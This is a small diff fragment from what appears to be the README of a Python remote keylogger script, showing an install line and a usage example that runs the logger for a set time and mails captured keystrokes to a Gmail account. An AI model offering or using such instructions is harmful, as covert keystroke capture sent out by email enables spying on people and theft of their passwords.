@@ -6,6 +6,7 @@ python requirement for code:
 #pip install smtplib
 
 Python Remote keylogger execution:
+
 eg: #python rlogger.py --time 60 --mail yourmail@gmail.com --password yourmailpasswd
 
 options arguments requirements:
